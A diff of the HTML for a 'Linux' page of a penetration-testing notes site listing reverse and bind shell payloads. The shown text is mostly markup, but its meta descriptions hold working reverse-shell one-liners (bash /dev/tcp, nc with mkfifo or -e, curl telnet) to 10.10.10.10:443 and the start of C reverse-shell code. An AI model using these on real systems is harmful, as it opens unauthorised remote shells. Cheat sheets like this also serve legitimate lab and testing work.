@@ -1,33 +1,536 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><title>Linux | D0CUM3NTN4T10N</title>
-<meta name=viewport content="width=device-width,initial-scale=1"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=https://documentnation.github.io/favicon.ico sizes=any><link rel=apple-touch-icon sizes=180x180 href=https://documentnation.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://documentnation.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://documentnation.github.io/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://documentnation.github.io/site.webmanifest><meta property="og:title" content="Linux"><meta property="og:description" content="Reverse link Bash link sh -i >& /dev/tcp/10.10.10.10/443 0>&amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc 10.10.10.10 443 >/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C='curl -Ns telnet://10.10.10.10:443'; $C </dev/null 2>&amp;1 | sh 2>&amp;1 | $C >/dev/null C link #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr."><meta property="og:type" content="article"><meta property="og:url" content="https://documentnation.github.io/docs/shells/linux/"><meta property="og:image" content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_3848429645321916102.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2023-12-02T13:24:59+05:30"><meta property="article:modified_time" content="2023-12-02T13:24:59+05:30"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_3848429645321916102.png"><meta name=twitter:title content="Linux"><meta name=twitter:description content="Reverse link Bash link sh -i >& /dev/tcp/10.10.10.10/443 0>&amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc 10.10.10.10 443 >/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C='curl -Ns telnet://10.10.10.10:443'; $C </dev/null 2>&amp;1 | sh 2>&amp;1 | $C >/dev/null C link #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr."><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=https://documentnation.github.io/docs/js/flexsearch.bundle.min.70b92c4c5202c26b45d7aa43e130e8440032cac751b9b9206ddba2052699286ac95beb01bb7f975514cc694a019a03c8.js integrity=sha384-cLksTFICwmtF16pD4TDoRAAyysdRubkgbduiBSaZKGrJW+sBu3+XVRTMaUoBmgPI crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=JetBrains+Mono:100,200,300,400,500,600,700,800|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.b49e59cf5cffb600c180964d03ba8ff5aaba2f6d26701bc2dd7a2082ac9cf849599b4f38cbbc52d928f85c9fb2f4455a.css integrity=sha384-tJ5Zz1z/tgDBgJZNA7qP9aq6L20mcBvC3Xoggqyc+ElZm084y7xS2Sj4XJ+y9EVa crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=https://documentnation.github.io/docs/htb/><i class="material-icons me-2">tag</i>
-HTB</a></li><li class="sidebar-dropdown current active"><button class=btn>
-<i class="material-icons me-2">terminal</i>
-Shells</button><div class="sidebar-submenu d-block"><ul><li class=current><a class=sidebar-nested-link href=https://documentnation.github.io/docs/shells/linux/>Linux</a></li><li><a class=sidebar-nested-link href=https://documentnation.github.io/docs/shells/windows/>Windows</a></li><li><a class=sidebar-nested-link href=https://documentnation.github.io/docs/shells/web/>Web</a></li></ul></div></li><li><a class=sidebar-root-link href=https://documentnation.github.io/docs/enumeration/><i class="material-icons me-2">format_list_numbered_rtl</i>
-Enumeration</a></li><li class=sidebar-dropdown><button class=btn>
-<i class="material-icons me-2">travel_explore</i>
-Reconnaissance</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://documentnation.github.io/docs/reconnaissance/portscan/>Portscan</a></li></ul></div></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
-<span class="material-icons size-20 menu-icon align-middle">menu</span>
-</button>
-<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
-<span class="material-icons size-20 menu-icon align-middle">search</span>
-<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg></kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
-<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
-<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
-cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
-</a><meta itemprop=position content="1"></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/shells/><span itemprop=name>Shells</span>
-</a><meta itemprop=position content="2"></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Linux</span>
-<meta itemprop=position content="3"></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><ul><li><a href=#reverse>Reverse</a><ul><li><a href=#bash>Bash</a></li><li><a href=#nc>NC</a></li><li><a href=#curl>Curl</a></li><li><a href=#c>C</a></li><li><a href=#c-1>C#</a></li><li><a href=#perl>Perl</a></li><li><a href=#php>PHP</a></li><li><a href=#python>Python</a></li><li><a href=#ruby>Ruby</a></li><li><a href=#nodejs>Node.js</a></li><li><a href=#java>Java</a></li><li><a href=#javascript>Javascript</a></li><li><a href=#telnet>Telnet</a></li><li><a href=#zsh>Zsh</a></li><li><a href=#lua>Lua</a></li><li><a href=#awk>AWK</a></li><li><a href=#dart>Dart</a></li></ul></li><li><a href=#bind>Bind</a><ul><li><a href=#python-1>Python</a></li><li><a href=#php-1>PHP</a></li><li><a href=#nc-1>NC</a></li><li><a href=#perl-1>Perl</a></li></ul></li><li><a href=#metasploit>Metasploit</a><ul><li><a href=#linux-meterpreter-staged>Linux Meterpreter Staged</a></li><li><a href=#linux-meterpreter-stageless>Linux Meterpreter Stageless</a></li><li><a href=#php-meterpreter-stageless>PHP Meterpreter Stageless</a></li><li><a href=#reverse-php>Reverse PHP</a></li><li><a href=#jsp-stageless>JSP Stageless</a></li><li><a href=#war-stageless-reverse>War Stageless Reverse</a></li><li><a href=#python-stageless-reverse>Python Stageless Reverse</a></li><li><a href=#bash-stageless-reverse>Bash Stageless Reverse</a></li></ul></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
-Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><ul><li><a href=#reverse>Reverse</a><ul><li><a href=#bash>Bash</a></li><li><a href=#nc>NC</a></li><li><a href=#curl>Curl</a></li><li><a href=#c>C</a></li><li><a href=#c-1>C#</a></li><li><a href=#perl>Perl</a></li><li><a href=#php>PHP</a></li><li><a href=#python>Python</a></li><li><a href=#ruby>Ruby</a></li><li><a href=#nodejs>Node.js</a></li><li><a href=#java>Java</a></li><li><a href=#javascript>Javascript</a></li><li><a href=#telnet>Telnet</a></li><li><a href=#zsh>Zsh</a></li><li><a href=#lua>Lua</a></li><li><a href=#awk>AWK</a></li><li><a href=#dart>Dart</a></li></ul></li><li><a href=#bind>Bind</a><ul><li><a href=#python-1>Python</a></li><li><a href=#php-1>PHP</a></li><li><a href=#nc-1>NC</a></li><li><a href=#perl-1>Perl</a></li></ul></li><li><a href=#metasploit>Metasploit</a><ul><li><a href=#linux-meterpreter-staged>Linux Meterpreter Staged</a></li><li><a href=#linux-meterpreter-stageless>Linux Meterpreter Stageless</a></li><li><a href=#php-meterpreter-stageless>PHP Meterpreter Stageless</a></li><li><a href=#reverse-php>Reverse PHP</a></li><li><a href=#jsp-stageless>JSP Stageless</a></li><li><a href=#war-stageless-reverse>War Stageless Reverse</a></li><li><a href=#python-stageless-reverse>Python Stageless Reverse</a></li><li><a href=#bash-stageless-reverse>Bash Stageless Reverse</a></li></ul></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">terminal</i><h1 class="content-title mb-0">Linux</h1></div><p class="lead mb-3"></p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h2 id=reverse>Reverse <a href=#reverse class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><hr><h3 id=bash>Bash <a href=#bash class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5800016 class=language-bash>
+<!DOCTYPE html>
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <title>Linux | D0CUM3NTN4T10N</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
+    <meta name="author" content="Colin Wilson - Lotus Labs" />
+    <meta name="email" content="support@aigis.uk" />
+    <meta name="website" content="https://lotusdocs.dev" />
+    <meta name="Version" content="v0.1.0" />
+    
+    <link rel="icon" href="https://documentnation.github.io/favicon.ico" sizes="any">
+<link rel="apple-touch-icon" sizes="180x180" href="https://documentnation.github.io/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://documentnation.github.io/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://documentnation.github.io/favicon-16x16.png">
+<link rel="manifest" crossorigin="use-credentials" href="https://documentnation.github.io/site.webmanifest">
+<meta property="og:title" content="Linux" />
+<meta property="og:description" content="Reverse link Bash link sh -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt;/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C=&#39;curl -Ns telnet://10.10.10.10:443&#39;; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null C link #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://documentnation.github.io/docs/shells/linux/" /><meta property="og:image" content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_3848429645321916102.png"/><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-12-02T13:24:59+05:30" />
+<meta property="article:modified_time" content="2023-12-02T13:24:59+05:30" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_3848429645321916102.png"/>
+<meta name="twitter:title" content="Linux"/>
+<meta name="twitter:description" content="Reverse link Bash link sh -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt;/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C=&#39;curl -Ns telnet://10.10.10.10:443&#39;; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null C link #include &lt;stdio.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr."/>
+
+    
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    
+    
+            
+                
+                <script type="text/javascript" src="https://documentnation.github.io/docs/js/flexsearch.bundle.min.70b92c4c5202c26b45d7aa43e130e8440032cac751b9b9206ddba2052699286ac95beb01bb7f975514cc694a019a03c8.js" integrity="sha384-cLksTFICwmtF16pD4TDoRAAyysdRubkgbduiBSaZKGrJW&#43;sBu3&#43;XVRTMaUoBmgPI" crossorigin="anonymous"></script>
+                
+        
+    
+    
+    
+    
+        
+        
+        
+        
+    
+        
+        
+        
+        
+    
+    
+    <link rel="preconnect" href="https://fonts.gstatic.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+    <link href="https://fonts.googleapis.com/css?family=JetBrains+Mono:100,200,300,400,500,600,700,800|Fira+Code:500,700&display=block" rel="stylesheet">
+
+    <link rel="stylesheet" href="/docs/scss/style.min.b49e59cf5cffb600c180964d03ba8ff5aaba2f6d26701bc2dd7a2082ac9cf849599b4f38cbbc52d928f85c9fb2f4455a.css" integrity="sha384-tJ5Zz1z/tgDBgJZNA7qP9aq6L20mcBvC3Xoggqyc&#43;ElZm084y7xS2Sj4XJ&#43;y9EVa"crossorigin="anonymous">
+    
+    
+    
+    </head><body>
+        <div class="content">
+            <div class="page-wrapper toggled">
+<nav id="sidebar" class="sidebar-wrapper">
+    <div class="sidebar-brand">
+        <a href='/' aria-label="HomePage" alt="HomePage">
+            
+                <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+            
+        </a>
+    </div>
+    <div class="sidebar-content" style="height: calc(100% - 131px);">
+        <ul class="sidebar-menu">
+            
+                
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/htb/">
+                                <i class="material-icons me-2">tag</i>
+                                
+                                HTB
+                            </a>
+                        </li>
+                    
+                
+                    
+                    
+                        <li class="sidebar-dropdown  current active">
+                            <button class="btn">
+                                <i class="material-icons me-2">terminal</i>
+                                Shells
+                            </button>
+                            <div class="sidebar-submenu d-block">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class="current "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/shells/linux/">Linux</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/shells/web/">Web</a></li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/enumeration/">
+                                <i class="material-icons me-2">format_list_numbered_rtl</i>
+                                
+                                Enumeration
+                            </a>
+                        </li>
+                    
+                
+                    
+                    
+                        <li class="sidebar-dropdown  ">
+                            <button class="btn">
+                                <i class="material-icons me-2">travel_explore</i>
+                                Reconnaissance
+                            </button>
+                            <div class="sidebar-submenu ">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/reconnaissance/portscan/">Portscan</a></li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+            
+        </ul>
+        
+    </div>
+    
+        <ul class="sidebar-footer list-unstyled mb-0">
+            
+        </ul>
+    
+</nav>
+
+                    <main class="page-content bg-transparent">
+                        
+<div id="top-header" class="top-header d-print-none">
+    <div class="header-bar d-flex justify-content-between">
+        <div class="d-flex align-items-center">
+            <a href='/' class="logo-icon me-3" aria-label="HomePage" alt="HomePage">
+                <div class="small">
+                    
